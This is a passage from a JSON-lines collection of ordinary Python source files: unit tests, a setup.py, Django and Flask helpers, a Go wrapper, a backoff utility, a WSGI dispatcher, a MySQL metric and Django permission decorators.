r[\"carebears\"]\n                voters[\"no\"].append(r)\n            elif r[\"vote\"] == \"abstain\":\n                voters[\"abstain\"].append(r)\n        return (voters, yes, no)\n\n\nuser = \"munin\"\ndb = \"patools30\"\nconn = psycopg2.connect(\"user=%s dbname=%s\" % (user, db))\nconn.serialize()\nconn.autocommit()\ncurs = conn.cursor(cursor_factory=psycopg2.extras.DictCursor)\nm = migrator(curs)\nm.add_padding()\n"}
{"text": "# -*- coding: utf-8 -*-\n\nimport math\n\ntry:\n    import unittest2 as unittest\nexcept:\n    import unittest\n\nfrom bssrdf_estimate.tools import Vector3D\n\nclass Vector3DTest(unittest.TestCase):\n    def test_instance(self):\n        v = Vector3D()\n        self.assertEqual(v.x, 0.0)\n        self.assertEqual(v.y, 0.0)\n        self.assertEqual(v.z, 0.0)\n\n        v = Vector3D(1.0, 2.0, 3.0)\n        self.assertEqual(v.x, 1.0)\n        self.assertEqual(v.y, 2.0)\n        self.assertEqual(v.z, 3.0)\n\n    def test_assign_exception(self):\n        v = Vector3D()\n        with self.assertRaises(Exception):\n            v.x = 1.0\n        with self.assertRaises(Exception):\n            v.y = 1.0\n        with self.assertRaises(Exception):\n            v.z = 1.0\n\n    def test_negation(self):\n        v = Vector3D(1.0, 2.0, 3.0)\n        u = -v\n        self.assertEqual(-v.x, u.x)\n        self.assertEqual(-v.y, u.y)\n        self.assertEqual(-v.z, u.z)\n\n    def test_add_and_sub(self):\n        v = Vector3D(1.0, 2.0, 3.0)\n        u = Vector3D(4.0, 5.0, 6.0)\n        w = v + u\n        self.assertEqual(w.x, 5.0)\n        self.assertEqual(w.y, 7.0)\n        self.assertEqual(w.z, 9.0)\n\n        w = v - u\n        self.assertEqual(w.x, -3.0)\n        self.assertEqual(w.y, -3.0)\n        self.assertEqual(w.z, -3.0)\n\n    def test_mul_and_div(self):\n        v = Vector3D(1.0, 2.0, 3.0)\n        u = v * 2.0\n        self.assertEqual(v.x * 2.0, u.x)\n        self.assertEqual(v.y * 2.0, u.y)\n        self.assertEqual(v.z * 2.0, u.z)\n\n        u = 3.0 * v\n        self.assertEqual(v.x * 3.0, u.x)\n        self.assertEqual(v.y * 3.0, u.y)\n        self.assertEqual(v.z * 3.0, u.z)\n\n        w = v / 2.0\n        self.assertAlmostEqual(v.x / 2.0, w.x)\n        self.assertAlmostEqual(v.y / 2.0, w.y)\n        self.assertAlmostEqual(v.z / 2.0, w.z)\n\n        with self.assertRaises(Exception):\n            w = u / 0.0\n\n    def test_dot(self):\n        u = Vector3D(1.0, 2.0, 3.0)\n        v = Vector3D(2.0, 3.0, 4.0)\n        self.assertAlmostEqual(v.dot(u), 20.0)\n        self.assertEqual(u.dot(v), v.dot(u))\n\n    def test_norm_and_normalized(self):\n        u = Vector3D(1.0, 2.0, 3.0)\n        self.assertAlmostEqual(u.norm(), math.sqrt(14.0))\n\n        nrm = u.norm()\n        v = u.normalized()\n        self.assertAlmostEqual(u.x / nrm, v.x)\n        self.assertAlmostEqual(u.y / nrm, v.y)\n        self.assertAlmostEqual(u.z / nrm, v.z)\n\n        w = Vector3D()\n        with self.assertRaises(Exception):\n            w.normalized()\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "\"\"\"\nsetup.py\n\nThe latest version of this package is available at:\n<https://github.com/jantman/gw2copilot>\n\n################################################################################\nCopyright 2016 Jason Antman <jason@jasonantman.com> <http://www.jasonantman.com>\n\n    This file is part of gw2copilot.\n\n    gw2copilot is free software: you can redistribute it and/or modify\n    it under the terms of the GNU Affero General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    gw2copilot is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU Affero General Public License for more details.\n\n    You should have received a copy of the GNU Affero General Public License\n    along with gw2copilot.  If not, see <http://www.gnu.org/licenses/>.\n\nThe Copyright and Authors attributions contained herein may not be removed or\notherwise altered, except to add the Author attribution of a contributor to\nthis work. (Additional Terms pursuant to Section 7b of the AGPL v3)\n################################################################################\nWhile not legally required, I sincerely request that anyone who finds\nbugs please submit them at <https://github.com/jantman/gw2copilot> or\nto me via email, and that you send any contributions or improvements\neither as a pull request on GitHub, or to me via email.\n################################################################################\n\nAUTHORS:\nJason Antman <jason@jasonantman.com> <http://www.jasonantman.com>\n################################################################################\n\"\"\"\n\nfrom setuptools import setup, find_packages\nfrom gw2copilot.version import VERSION, PROJECT_URL\n\nwith open('README.rst') as file:\n    long_description = file.read()\n\n# NOTE: when adding dependencies, be sure to add them to\n# requirements_docs.txt as well.\nrequires = [\n    'requests',\n    'twisted>=16.0.0,<17.0.0',\n    'psutil>=4.4.0,<5.0',\n    'klein>=15.0.0,<16.0.0',\n    'Jinja2>=2.8.0, <2.9.0',\n    'autobahn>=0.16.0,<0.17.0',\n    'pillow>=3.4.0,<4.0.0',\n    'slimit>=0.8.0,<0.9.0',\n    'versionfinder>=0.1.0,<0.2.0'\n]\n\nclassifiers = [\n    'Development Status :: 2 - Pre-Alpha',\n    'Environment :: Console',\n    'Environment :: Web Environment',\n    'Framework :: Twisted',\n    'Intended Audience :: End Users/Desktop',\n    'License :: OSI Approved :: GNU Affero General Public License v3 or later (AGPLv3+)',\n    'Natural Language :: English',\n    'Operating System :: Microsoft :: Windows',\n    'Operating System :: POSIX',\n    'Operating System :: POSIX :: Linux',\n    'Programming Language :: Python :: 2.7',\n    'Programming Language :: Python :: 2 :: Only',\n    # Programming Language :: Python :: 3\n    # Programming Language :: Python :: 3.0\n    # Programming Language :: Python :: 3.1\n    # Programming Language :: Python :: 3.2\n    # Programming Language :: Python :: 3.3\n    # Programming Language :: Python :: 3.4\n    # Programming Language :: Python :: 3.5\n    # Programming Language :: Python :: 3.6\n    # Programming Language :: Python :: 3 :: Only\n    'Programming Language :: Python :: Implementation :: CPython',\n    'Topic :: Games/Entertainment'\n]\n\nsetup(\n    name='gw2copilot',\n    version=VERSION,\n    author='Jason Antman',\n    author_email='jason@jasonantman.com',\n    packages=find_packages(),\n    package_data={\n        'gw2copilot': [\n            'templates/*.html',\n            'static/*.*'\n        ]\n    },\n    url=PROJECT_URL,\n    description='gw2copilot is a browser-based \"helper\" for Guild Wars '\n                '2, to automate manual tasks that players currently perform '\n                'out of the game.',\n    long_description=long_description,\n    keywords=\"gw2 guildwars arenanet mumble mumblelink\",\n    classifiers=classifiers,\n    install_requires=requires,\n    entry_points=\"\"\"\n    [console_scripts]\n    gw2copilot = gw2copilot.runner:console_entry_point\n    \"\"\",\n)\n"}
{"text": "from django.conf.urls import url\n\nfrom rest_framework import routers, viewsets\n\nfrom rest_framework_nested import routers as nested_routers\n\n\nclass HybridRoutingMixin(object):\n    \"\"\"\n    Extends functionality of DefaultRouter adding possibility to register\n    simple API views, not just Viewsets.\n    Based on:\n    http://stackoverflow.com/questions/18818179/routing-api-views-in-django-rest-framework\n    http://stackoverflow.com/questions/18817988/using-django-rest-frameworks-browsable-api-with-apiviews\n    \"\"\"\n\n    def get_routes(self, viewset):\n        \"\"\"\n        Checks if the viewset is an instance of ViewSet, otherwise assumes\n        it's a simple view and does not run original `get_routes` code.\n        \"\"\"\n        if issubclass(viewset, viewsets.ViewSetMixin):\n            return super(HybridRoutingMixin, self).get_routes(viewset)\n\n        return []\n\n    def get_urls(self):\n        \"\"\"\n        Append non-viewset views to the urls generated by the original\n        `get_urls` method.\n        \"\"\"\n        # URLs for viewsets\n        ret = super(HybridRoutingMixin, self).get_urls()\n\n        # URLs for simple views\n        for prefix, viewset, basename in self.registry:\n\n            # Skip viewsets\n            if issubclass(viewset, viewsets.ViewSetMixin):\n                continue\n\n            # URL regex\n            regex = '{prefix}{trailing_slash}$'.format(\n                prefix=prefix,\n                trailing_slash=self.trailing_slash\n            )\n\n            # The view name has to have suffix \"-list\" due to specifics\n            # of the DefaultRouter implementation.\n            ret.append(url(regex, viewset.as_view(),\n                           name='{0}-list'.format(basename)))\n\n        return ret\n\n\nclass HybridDefaultRouter(HybridRoutingMixin, routers.DefaultRouter):\n    pass\n\n\nclass HybridSimpleRouter(HybridRoutingMixin, routers.SimpleRouter):\n    pass\n\n\nclass HybridNestedRouter(HybridRoutingMixin, nested_routers.NestedSimpleRouter):\n    pass\n"}
{"text": "#!/usr/bin/env python\n\n\"\"\"\nElectreTriClassAssignments - computes assignments according to the Electre TRI\nmethod. It generates separate outputs for the conjuctive ('pessimistic') and\ndisjunctive ('optimistic') assignments.\n\nUsage:\n    ElectreTriClassAssignments.py -i DIR -o DIR\n\nOptions:\n    -i DIR     Specify input directory. It should contain the following files:\n                   alternatives.xml\n                   classes.xml\n                   classes_profiles.xml\n                   outranking.xml\n    -o DIR     Specify output directory. Files generated as output:\n                   assignments_conjuctive.xml\n                   assignments_disjunctive.xml\n    --version  Show version.\n    -h --help  Show this screen.\n\"\"\"\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport os\nimport sys\nimport traceback\n\nfrom docopt import docopt\n\nfrom common import assignments_to_xmcda, create_messages_file, get_dirs, \\\n    get_error_message, get_input_data, get_relation_type, write_xmcda, Vividict\n\n__version__ = '0.2.0'\n\n\ndef assign_class(alternatives, categories_rank, categories_profiles,\n                 outranking):\n    # sort categories by their rank, but we want the worst one on the 'left'\n    # - hence 'reverse=True'\n    categories = [i[0] for i in sorted(categories_rank.items(),\n                                       key=lambda x: x[1], reverse=True)]\n    exploitation = Vividict()\n    for alternative in alternatives:\n        # conjuctive ('pessimistic' - from 'best' to 'worst')\n        conjuctive_idx = 0\n        for profile_idx, profile in list(enumerate(categories_profiles))[::-1]:\n            relation = get_relation_type(alternative, profile, outranking)\n            if relation in ('indifference', 'preference'):\n                conjuctive_idx = profile_idx + 1\n                break\n            else:\n                continue\n        # disjunctive ('optimistic' - from 'worst' to 'best')\n        disjunctive_idx = len(categories_profiles)\n        for profile_idx, profile in enumerate(categories_profiles):\n            relation = get_relation_type(profile, alternative, outranking)\n            if relation == 'preference':\n                disjunctive_idx = profile_idx\n                break\n            else:\n                continue\n        exploitation[alternative] = (categories[conjuctive_idx],\n                                     categories[disjunctive_idx])\n    return exploitation\n\n\ndef main():\n    try:\n        args = docopt(__doc__, version=__version__)\n        output_dir = None\n        input_dir, output_dir = get_dirs(args)\n        filenames = [\n            # every tuple below == (filename, is_optional)\n            ('alternatives.xml', False),\n            ('classes.xml', False),\n            ('classes_profiles.xml', False),\n            ('outranking.xml', False),\n        ]\n        params = [\n            'alternatives',\n            'categories_profiles',\n            'categories_rank',\n            'outranking',\n        ]\n        d = get_input_data(input_dir, filenames, params,\n                           comparison_with='boundary_profiles')\n\n        assignments = assign_class(d.alternatives, d.categories_rank,\n                                   d.categories_profiles, d.outranking)\n\n        # uncomment this if you want output combined as a single file (and\n        # remember to import assignments_as_intervals_to_xmcda):\n        # xmcda_intervals = assignments_as_intervals_to_xmcda(assignments)\n        # write_xmcda(xmcda_intervals,\n        #             os.path.join(output_dir, 'assignments_intervals.xml'))\n        assignments_con = {i[0]: i[1][0] for i in assignments.iteritems()}\n        xmcda_con = assignments_to_xmcda(assignments_con)\n        write_xmcda(xmcda_con, os.path.join(output_dir,\n                                            'assignments_conjuctive.xml'))\n        assignments_dis = {i[0]: i[1][1] for i in assignments.iteritems()}\n        xmcda_dis = assignments_to_xmcda(assignments_dis)\n        write_xmcda(xmcda_dis, os.path.join(output_dir,\n                                            'assignments_disjunctive.xml'))\n        create_messages_file(None, ('Everything OK.',), output_dir)\n        return 0\n    except Exception, err:\n        err_msg = get_error_message(err)\n        log_msg = traceback.format_exc()\n        print(log_msg.strip())\n        create_messages_file((err_msg, ), (log_msg, ), output_dir)\n        return 1\n\n\nif __name__ == '__main__':\n    sys.exit(main())\n"}
{"text": "import unittest\n\nfrom chainer.testing import condition\n\n\n# The test fixtures of this TestCase is used to be decorated by\n# decorator in test. So we do not run them alone.\nclass MockUnitTest(unittest.TestCase):\n\n    failure_case_counter = 0\n    success_case_counter = 0\n    probabilistic_case_counter = 0\n    probabilistic_case_success_counter = 0\n    probabilistic_case_failure_counter = 0\n\n    def failure_case(self):\n        self.failure_case_counter += 1\n        self.fail()\n\n    def success_case(self):\n        self.success_case_counter += 1\n        self.assertTrue(True)\n\n    def probabilistic_case(self):\n        self.probabilistic_case_counter += 1\n        if self.probabilistic_case_counter % 2 == 0:\n            self.probabilistic_case_success_counter += 1\n            self.assertTrue(True)\n        else:\n            self.probabilistic_case_failure_counter += 1\n            self.fail()\n\n    def runTest(self):\n        pass\n\n\ndef _should_fail(self, f):\n    self.assertRaises(AssertionError, f, self.unit_test)\n\n\ndef _should_pass(self, f):\n    f(self.unit_test)\n\n\nclass TestRepeatWithSuccessAtLeast(unittest.TestCase):\n\n    def _decorate(self, f, times, min_success):\n        return condition.repeat_with_success_at_least(\n            times, min_success)(f)\n\n    def setUp(self):\n        self.unit_test = MockUnitTest()\n\n    def test_all_trials_fail(self):\n        f = self._decorate(MockUnitTest.failure_case, 10, 1)\n        _should_fail(self, f)\n        self.assertEqual(self.unit_test.failure_case_counter, 10)\n\n    def test_all_trials_fail2(self):\n        f = self._decorate(MockUnitTest.failure_case, 10, 0)\n        _should_pass(self, f)\n        self.assertLessEqual(self.unit_test.failure_case_counter, 10)\n\n    def test_all_trials_succeed(self):\n        f = self._decorate(MockUnitTest.success_case, 10, 10)\n        _should_pass(self, f)\n        self.assertEqual(self.unit_test.success_case_counter, 10)\n\n    def test_all_trials_succeed2(self):\n        self.assertRaises(AssertionError,\n                          condition.repeat_with_success_at_least,\n                          10, 11)\n\n    def test_half_of_trials_succeed(self):\n        f = self._decorate(MockUnitTest.probabilistic_case, 10, 5)\n        _should_pass(self, f)\n        self.assertLessEqual(self.unit_test.probabilistic_case_counter, 10)\n        self.assertGreaterEqual(\n            self.unit_test.probabilistic_case_success_counter, 5)\n        self.assertLessEqual(\n            self.unit_test.probabilistic_case_failure_counter, 5)\n\n    def test_half_of_trials_succeed2(self):\n        f = self._decorate(MockUnitTest.probabilistic_case, 10, 6)\n        _should_fail(self, f)\n        self.assertLessEqual(self.unit_test.probabilistic_case_counter, 10)\n        self.assertLess(\n            self.unit_test.probabilistic_case_success_counter, 6)\n        self.assertGreaterEqual(\n            self.unit_test.probabilistic_case_failure_counter, 5)\n\n\nclass TestRepeat(unittest.TestCase):\n\n    def _decorate(self, f, times):\n        return condition.repeat(times)(f)\n\n    def setUp(self):\n        self.unit_test = MockUnitTest()\n\n    def test_failure_case(self):\n        f = self._decorate(MockUnitTest.failure_case, 10)\n        _should_fail(self, f)\n        self.assertLessEqual(self.unit_test.failure_case_counter, 10)\n\n    def test_success_case(self):\n        f = self._decorate(MockUnitTest.success_case, 10)\n        _should_pass(self, f)\n        self.assertEqual(self.unit_test.success_case_counter, 10)\n\n    def test_probabilistic_case(self):\n        f = self._decorate(MockUnitTest.probabilistic_case, 10)\n        _should_fail(self, f)\n        self.assertLessEqual(self.unit_test.probabilistic_case_counter, 10)\n        self.assertLess(self.unit_test.probabilistic_case_success_counter, 10)\n        self.assertGreater(\n            self.unit_test.probabilistic_case_failure_counter, 0)\n\n\nclass TestRetry(unittest.TestCase):\n\n    def _decorate(self, f, times):\n        return condition.retry(times)(f)\n\n    def setUp(self):\n        self.unit_test = MockUnitTest()\n\n    def test_failure_case(self):\n        f = self._decorate(MockUnitTest.failure_case, 10)\n        _should_fail(self, f)\n        self.assertEqual(self.unit_test.failure_case_counter, 10)\n\n    def test_success_case(self):\n        f = self._decorate(MockUnitTest.success_case, 10)\n        _should_pass(self, f)\n        self.assertLessEqual(self.unit_test.success_case_counter, 10)\n\n    def test_probabilistic_case(self):\n        f = self._decorate(MockUnitTest.probabilistic_case, 10)\n        _should_pass(self, f)\n        self.assertLessEqual(\n            self.unit_test.probabilistic_case_counter, 10)\n        self.assertGreater(\n            self.unit_test.probabilistic_case_success_counter, 0)\n        self.assertLess(self.unit_test.probabilistic_case_failure_counter, 10)\n"}
{"text": "\"\"\"Defines distributions from which to sample conditional data.\"\"\"\n\nimport numpy as np\nfrom pylearn2.format.target_format import OneHotFormatter\nfrom pylearn2.space import VectorSpace\nfrom pylearn2.utils import sharedX\nimport theano\nimport theano.tensor as T\nfrom theano.tensor.shared_randomstreams import RandomStreams\n\n\nclass Distribution(object):\n    def __init__(self, space):\n        self.space = space\n\n    def get_space(self):\n        return self.space\n\n    def get_total_dimension(self):\n        return self.space.get_total_dimension()\n\n    def sample(self, n):\n        \"\"\"\n        Parameters\n        ----------\n        n : integer\n            Number of samples to generate\n\n        Returns\n        -------\n        samples : batch of members of output space\n        \"\"\"\n\n        raise NotImplementedError(\"abstract method\")\n\n\nclass OneHotDistribution(Distribution):\n    \"\"\"Randomly samples from a distribution of one-hot vectors.\"\"\"\n\n    def __init__(self, space, rng=None):\n        super(OneHotDistribution, self).__init__(space)\n\n        self.dim = space.get_total_dimension()\n        self.formatter = OneHotFormatter(self.dim, dtype=space.dtype)\n\n        self.rng = RandomStreams() if rng is None else rng\n\n    def sample(self, n):\n        idxs = self.rng.random_integers((n, 1), low=0, high=self.dim - 1)\n        return self.formatter.theano_expr(idxs, mode='concatenate')\n\n\nclass KernelDensityEstimateDistribution(Distribution):\n    \"\"\"Randomly samples from a kernel density estimate yielded by a set\n    of training points.\n\n    Simple sampling procedure [1]:\n\n    1. With training points $x_1, ... x_n$, sample a point $x_i$\n       uniformly\n    2. From original KDE, we have a kernel defined at point $x_i$;\n       sample randomly from this kernel\n\n    [1]: http://www.stat.cmu.edu/~cshalizi/350/lectures/28/lecture-28.pdf\n    \"\"\"\n\n    def __init__(self, X, bandwidth=1, space=None, rng=None):\n        \"\"\"\n        Parameters\n        ----------\n        X : ndarray of shape (num_examples, num_features)\n            Training examples from which to generate a kernel density\n            estimate\n\n        bandwidth : float\n            Bandwidth (or h, or sigma) of the generated kernels\n        \"\"\"\n\n        assert X.ndim == 2\n        if space is None:\n            space = VectorSpace(dim=X.shape[1], dtype=X.dtype)\n\n        # super(KernelDensityEstimateDistribution, self).__init__(space)\n\n        self.X = sharedX(X, name='KDE_X')\n\n        self.bandwidth = sharedX(bandwidth, name='bandwidth')\n        self.rng = RandomStreams() if rng is None else rng\n\n    def sample(self, n):\n        # Sample $n$ training examples\n        training_samples = self.X[self.rng.choice(size=(n,), a=self.X.shape[0], replace=True)]\n\n        # Sample individually from each selected associated kernel\n        #\n        # (not well documented within NumPy / Theano, but rng.normal\n        # call samples from a multivariate normal with diagonal\n        # covariance matrix)\n        ret = self.rng.normal(size=(n, self.X.shape[1]),\n                              avg=training_samples, std=self.bandwidth,\n                              dtype=theano.config.floatX)\n\n        return ret\n"}
{"text": "from flask_login import current_user\n\nfrom app.brain.utilities import prepare_history_entry\nfrom app.constants import HISTORY_CONSTANTS, TAXONOMY_CONSTANTS\nfrom app.service import RepExercisesHistoryService, RepExercisesTaxonomyService\n\n\nclass UserData(object):\n    \"\"\"\n    Returns the relevant data for one user\n\n    I N T E R F A C E   G U A R A N T E E D\n    ---------------------------------------\n    get_user_data(cls):\n        -- Returns a dictionary with the nickname, user_id, all rep exercises history and rep exercises taxonomy\n            specific to that user\n    \"\"\"\n    @classmethod\n    def get_user_data(cls):\n        user_data = {'nickname': cls._get_current_user_nickname(), 'user_id': cls._get_current_user_id(),\n                     HISTORY_CONSTANTS.GROUP_NAME: cls._get_user_rep_history()}\n        user_data[TAXONOMY_CONSTANTS.GROUP_NAME] = cls._get_taxonomies_for_exercises(\n            cls._convert_rep_exercises_to_exercise_ids(user_data[HISTORY_CONSTANTS.GROUP_NAME])\n        )\n        return user_data\n\n    @classmethod\n    def _get_user_rep_history(cls):\n        exercises = RepExercisesHistoryService.get_list_of_users_exercises(cls._get_current_user_id())\n        return [prepare_history_entry(x) for x in exercises]\n\n    @staticmethod\n    def _get_current_user_nickname():\n        return current_user.nickname\n\n    @staticmethod\n    def _get_current_user_id():\n        return current_user.id\n\n    @staticmethod\n    def _convert_rep_exercises_to_exercise_ids(rep_exercises):\n        return [x.exercise_id for x in rep_exercises]\n\n    @staticmethod\n    def _get_taxonomies_for_exercises(exercise_ids):\n        return RepExercisesTaxonomyService.get_list_of_taxonomies_by_exercise_ids(exercise_ids)\n"}
{"text": "#!/usr/bin/env python3\n\"\"\"\nGO compiler wrapper (sets GOROOT automatically)\n\"\"\"\n\nimport glob\nimport os\nimport signal\nimport sys\n\nimport command_mod\nimport subtask_mod\n\n\nclass Main:\n    \"\"\"\n    Main class\n    \"\"\"\n\n    def __init__(self) -> None:\n        try:\n            self.config()\n            sys.exit(self.run())\n        except (EOFError, KeyboardInterrupt):\n            sys.exit(114)\n        except SystemExit as exception:\n            sys.exit(exception)\n\n    @staticmethod\n    def config() -> None:\n        \"\"\"\n        Configure program\n        \"\"\"\n        if hasattr(signal, 'SIGPIPE'):\n            signal.signal(signal.SIGPIPE, signal.SIG_DFL)\n        if os.name == 'nt':\n            argv = []\n            for arg in sys.argv:\n                files = glob.glob(arg)  # Fixes Windows globbing bug\n                if files:\n                    argv.extend(files)\n                else:\n                    argv.append(arg)\n            sys.argv = argv\n\n    @staticmethod\n    def run() -> int:\n        \"\"\"\n        Start program\n        \"\"\"\n        golang = command_mod.Command(os.path.join('bin', 'go'), errors='stop')\n        golang.extend_args(sys.argv[1:])\n\n        goroot = os.path.dirname(os.path.dirname(golang.get_file()))\n        if os.path.isdir(os.path.join(goroot, 'pkg')):\n            os.environ['GOROOT'] = goroot\n\n        subtask_mod.Exec(golang.get_cmdline()).run()\n\n        return 0\n\n\nif __name__ == '__main__':\n    if '--pydoc' in sys.argv:\n        help(__name__)\n    else:\n        Main()\n"}
{"text": "#!/usr/bin/env python3\n#!/usr/bin/python\n\nimport subprocess\nimport os\nimport shutil\nimport pty\n\nmaster, slave = pty.openpty()\nargs = ('stdin1.py')\n# popen = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd='.')\n# http://stackoverflow.com/questions/5411780/python-run-a-daemon-sub-process-read-stdout/5413588#5413588\n# not working\npopen = subprocess.Popen(args, shell=True, stdin=subprocess.PIPE, stdout=slave, stderr=slave, close_fds=True, cwd='.')\nstdout = os.fdopen(master)\n\n# set the O_NONBLOCK flag of p.stdout file descriptor:\n# flags = fcntl(popen1.stdout, F_GETFL) # get current popen1.stdout flags\n# fcntl(popen1.stdout, F_SETFL, flags | O_NONBLOCK)\n\npopen.stdin.write(\"this is line 0\\n\")\n# line = popen.stdout.readline()\n# line = stdout.readline()\n# print \"line = %s\" % line\nout, err = popen.communicate(input = \"this is line 1\\nthis is line 2\\n\\d\")\nif err != None:\n    print('errput = %s' % str(err))\n\nprint(\"output = %s\" % str(out))\nout2 = stdout.read()\nprint(\"output = %s\" % str(out))\n\nsubprocess.call(['echo', '\u0007'])\n"}
{"text": "# -*- coding: utf-8 -*-\n\n\"\"\"\nLow-level implementations of opaque methods.\n\"\"\"\n\nfrom __future__ import print_function, division, absolute_import\nimport string\n\nfrom flypy.compiler import opaque\nfrom pykit import ir, types as ptypes\n\n\ndef add_impl(opaque_func, name, implementation, restype=None, restype_func=None):\n    \"\"\"\n    Assign an implementation to an `opaque` function.\n\n    Sets up a pykit function and calls `implementation` to produce the\n    function body.\n    \"\"\"\n    def impl(py_func, argtypes):\n        # TODO: do this better\n        from flypy.compiler import representation_type\n\n        ll_argtypes = [representation_type(x) for x in argtypes]\n        argnames = list(string.ascii_letters[:len(argtypes)])\n\n        # Determine return type\n        if restype_func:\n            result_type = restype_func(argtypes)\n        else:\n            result_type = restype or ll_argtypes[0]\n\n        type = ptypes.Function(result_type, tuple(ll_argtypes), False)\n        func = ir.Function(name, argnames, type)\n        func.new_block(\"entry\")\n        b = ir.Builder(func)\n        b.position_at_beginning(func.startblock)\n        implementation(b, argtypes, *func.args)\n        return func\n\n    opaque.implement_opaque(opaque_func, impl)\n\n\ndef add_impl_cls(cls, name, implementation, restype=None, restype_func=None):\n    opaque_func = getattr(cls, name)\n    add_impl(opaque_func, name, implementation, restype, restype_func)\n"}
{"text": "\"\"\"Retry backoff strategies.\"\"\"\n\nimport random\nimport time\nfrom typing import Union\n\n__all__ = ['ExponentialBackoff']\n\n\nclass ExponentialBackoff:\n    \"\"\"An implementation of the exponential backoff strategy.\n\n    This is useful for getting an exponentially backed-off delay for\n    reconnection or retry actions.\n\n    Each call to ``delay`` will return the next exponentially backed-off\n    value, in seconds, to use for waiting. The backoff will continue for\n    each call, up to a maximum of 2^10 * base.\n\n    Args:\n        base: The base delay, in seconds. This is the starting point for\n            the returned exponentially backed off time values.\n        cap: The cap on the exponent, after which the backoff will not\n            grow exponentially. This is 9 by default (2^9 = 512 ~= 8.5 minutes)\n    \"\"\"\n\n    def __init__(self, base: int = 1, cap: int = 9) -> None:\n        self._base = base\n        self._exp = 0\n        self._max = cap\n\n        self._reset_time = base * 2 ** (self._max + 1)\n        self._last_invocation = time.monotonic()\n\n        self.rand = random.Random()\n        self.rand.seed()\n\n    def delay(self) -> Union[int, float]:\n        \"\"\"Get the next exponentially backed off time delay, in seconds.\n\n        The delay value is incremented exponentially with every call, up\n        to the defined max. If a period of time greater than 2^(max+1) * base\n        has passed, the backoff is reset.\n\n        Returns:\n            The time, in seconds, to be used as the next delay interval.\n        \"\"\"\n        invocation = time.monotonic()\n        interval = invocation - self._last_invocation\n        self._last_invocation = invocation\n\n        if interval > self._reset_time:\n            self._exp = 0\n\n        self._exp = min(self._exp + 1, self._max)\n        return self.rand.uniform(0, self._base * 2 ** self._exp)\n"}
{"text": "import re\nfrom wsgifire.helpers import func_from_str\nfrom wsgifire.core.helpers import permanent_redirect\nfrom wsgifire.exceptions import NoMatchingURL, ViewFunctionDoesNotExist\n\ndef dispatcher(request, url_seq):\n    \"\"\"\n    Match the requested url against patterns defined in settings.URLS and\n    return the resulting view function.w\n\n    Using this we can easily abstract URLs from project/filesystem layout.\n    \"\"\"\n    def parse_url(rel_url):\n        for url in url_seq:\n            match = re.match(url[0],rel_url)\n            if match:\n                # using 'args' to pull named groups from the url and passing them to the view, if any.\n                args = match.groupdict()\n                try:\n                    return_view = func_from_str(url[1])\n                except (AttributeError, ImportError) as error_instance:\n                    # If there is an import error or attribute error, the function probably\n                    # doesn't exist, throw our own appropriate error\n                    view_error = ViewFunctionDoesNotExist(url[0],url[1])\n                    view_error.with_traceback(error_instance.__traceback__)\n                    raise view_error\n                else:\n                    return return_view, args\n        raise NoMatchingURL(rel_url)\n\n    rel_url = request['PATH_INFO'][1:]\n    try:\n        return parse_url(rel_url)\n    except NoMatchingURL:\n        # If the path didn't match and the path doesn't end in a slash (excluding GET params),\n        # try redirecting to the same url with a slash appended.\n        if rel_url and rel_url[-1] != r'/':\n            return permanent_redirect(\"\".join([request['wsgi.url_scheme'], r'://', request['HTTP_HOST'],r'/',rel_url,r'/'])), None\n        raise NoMatchingURL(rel_url)\n"}
{"text": "import pymysql\nfrom sauron.metrics import Metric, MetricException\n\n\nclass MySQLMetric(Metric):\n    def __init__(self, name, host=None, user=None, passwd=None, **kwargs):\n        Metric.__init__(self, name, **kwargs)\n        self.reconfig(name, host, user, passwd)\n\n    def reconfig(self, name, host=None, user=None, passwd=None, **kwargs):\n        Metric.reconfig(self, name, **kwargs)\n        self.name   = name\n        self.host   = host\n        self.user   = user\n        self.passwd = passwd\n        self.conn   = None\n        self.cur    = None\n\n    def __del__(self):\n        try:\n            self.cur.close()\n            self.conn.close()\n        except AttributeError:\n            pass\n\n    def values(self):\n        try:\n            self.conn = pymysql.connect(host=self.host, user=self.user, passwd=self.passwd)\n            self.cur = self.conn.cursor()\n            self.cur.execute('show status')\n            r = dict(self.cur.fetchall())\n            return {\n                'results' : {\n                    'uptime' : (r['Uptime'] , 'Seconds'),\n                    'queries': (r['Queries'], 'Count')\n                }\n            }\n        except pymysql.err.MySQLError:\n            raise MetricException('Failed to connect to mySQL.')\n        except KeyError:\n            raise MetricException('Could not find all keys in mySQL status')\n\n"}
{"text": "# -*- coding: utf-8 -*-\n\nfrom functools import wraps\n\nfrom django.core.exceptions import PermissionDenied\nfrom django.contrib.auth.views import redirect_to_login\nfrom django.shortcuts import redirect\n\nfrom spirit.core.conf import settings\n\n\ndef moderator_required(view_func):\n    @wraps(view_func)\n    def wrapper(request, *args, **kwargs):\n        user = request.user\n\n        if not user.is_authenticated:\n            return redirect_to_login(next=request.get_full_path(),\n                                     login_url=settings.LOGIN_URL)\n\n        if not user.st.is_moderator:\n            raise PermissionDenied\n\n        return view_func(request, *args, **kwargs)\n\n    return wrapper\n\n\ndef administrator_required(view_func):\n    @wraps(view_func)\n    def wrapper(request, *args, **kwargs):\n        user = request.user\n\n        if not user.is_authenticated:\n            return redirect_to_login(next=request.get_full_path(),\n                                     login_url=settings.LOGIN_URL)\n\n        if not user.st.is_administrator:\n            raise PermissionDenied\n\n        return view_func(request, *args, **kwargs)\n\n    return wrapper\n\n\ndef guest_only(view_func):\n    # TODO: test!\n    @wraps(view_func)\n    def wrapper(request, *args, **kwargs):\n        if request.user.is_authenticated:\n            return redirect(request.GET.get('next', request.user.st.get_absolute_url()))\n\n        return view_func(request, *args, **kwargs)\n\n    return wrapper\n"}
